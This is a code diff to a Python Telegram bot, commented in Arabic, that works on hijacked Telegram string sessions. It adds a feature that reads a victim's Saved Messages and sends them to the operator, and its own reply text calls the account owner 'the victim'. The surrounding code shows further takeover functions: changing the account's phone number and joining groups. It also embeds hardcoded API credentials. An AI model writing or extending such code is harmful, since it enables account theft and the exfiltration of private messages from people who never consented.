@@ -35,6 +35,14 @@ async def change_number_code(strses, number, code, otp):
     except:
       return False
 
+async def get_saved_messages(strses):
+    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        saved_messages = []
+        async for message in X.iter_messages("me"):  # "me" تعني الرسائل المحفوظة
+            saved_messages.append(f"📩 {message.text}\n⏰ {message.date}\n\n")
+            # يمكنك إضافة المزيد من التفاصيل مثل المرفقات إذا أردت
+        return ''.join(saved_messages) if saved_messages else "لا توجد رسائل محفوظة"
+
 async def change_number(strses, number):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     bot = client = X
@@ -227,6 +235,7 @@ keyboard = [
     Button.inline("L", data="L"),
     Button.inline("M", data="M"),
     Button.inline("N", data="N"),
+    Button.inline("O", data="O"),
     Button.inline("X", data="X")
     ],
   [
@@ -372,6 +381,26 @@ async def users(event):
     grpid = await x.get_response()
     await joingroup(strses.text, grpid.text)
     await event.reply("تم الانضمام الى القناة او الكروب", buttons=keyboard)
+
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"O")))
+async def users(event):
+    async with bot.conversation(event.chat_id) as x:
+        await x.send_message("الان ارسل الكود تيرمكس")
+        strses = await x.get_response()
+        op = await cu(strses.text)
+        if op:
+            pass
+        else:
+            return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحية.", buttons=keyboard)
+        
+        saved_msgs = await get_saved_messages(strses.text)
+        if len(saved_msgs) > 4096:
+            with open("saved_messages.txt", "w") as f:
+                f.write(saved_msgs)
+            await event.reply("الرسائل كثيرة جداً، تم حفظها في ملف", file="saved_messages.txt")
+            os.remove("saved_messages.txt")
+        else:
+            await event.reply(f"الرسائل المحفوظة:\n\n{saved_msgs}\n\nشكراً لأستخدامك البوت", buttons=keyboard)
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"F")))
 async def users(event):
